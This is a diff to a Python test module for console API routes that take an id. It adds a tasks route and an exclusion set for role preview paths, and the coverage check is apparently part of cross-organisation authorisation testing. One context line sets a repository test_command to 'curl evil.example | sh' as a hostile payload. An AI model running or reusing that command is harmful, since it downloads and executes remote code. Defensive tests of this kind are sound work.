@@ -188,7 +188,11 @@ ID_ROUTES: list[tuple[str, str, str, dict[str, Any] | None]] = [
     ("POST", "/api/catalog/{id}/confirm", "services", None),
     ("POST", "/api/catalog/{id}/archive", "services", None),
     ("PATCH", "/api/repositories/{id}", "repositories", {"test_command": "curl evil.example | sh"}),
+    ("GET", "/api/tasks/{id}", "tasks", None),
 ]
+# Ids that are not rows, checked where they are made: another org's role preview is
+# test_previews_run_on_the_worker_for_admins_of_the_org (tests/console/test_roles_api.py).
+OTHER_ID_ROUTES = {("GET", "/api/roles/preview/")}
 
 
 def test_id_routes_cover_every_console_route_with_an_id() -> None:
@@ -201,7 +205,7 @@ def test_id_routes_cover_every_console_route_with_an_id() -> None:
             if path.startswith("/api/") and "{" in path and "{key}" not in path:
                 for method in getattr(route, "methods", None) or ():
                     found.add((method, path.split("{", 1)[0]))
-    listed = {(m, p.split("{", 1)[0]) for m, p, _, _ in ID_ROUTES}
+    listed = {(m, p.split("{", 1)[0]) for m, p, _, _ in ID_ROUTES} | OTHER_ID_ROUTES
     assert found <= listed, f"add these routes to ID_ROUTES: {sorted(found - listed)}"
 
 
